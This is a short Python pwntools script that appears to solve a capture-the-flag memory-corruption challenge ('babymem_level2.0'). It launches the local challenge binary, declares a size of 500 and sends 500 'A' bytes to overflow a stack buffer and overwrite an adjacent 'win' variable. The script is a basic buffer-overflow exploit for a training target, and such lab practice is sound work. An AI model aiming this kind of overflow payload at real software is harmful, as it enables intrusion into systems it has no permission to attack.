from pwn import *

# Init
elf = ELF("/challenge/babymem_level2.0")

buffer_length = int("20", 16) #local_20
distance_win_variable = int("18", 16) #local_18
distance_between_buffer_and_win_variable = buffer_length - distance_win_variable

io = elf.process()

# Payload

payload = b"A"*500

# Interaction

io.recvuntil("size:")
io.sendline(str(500))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()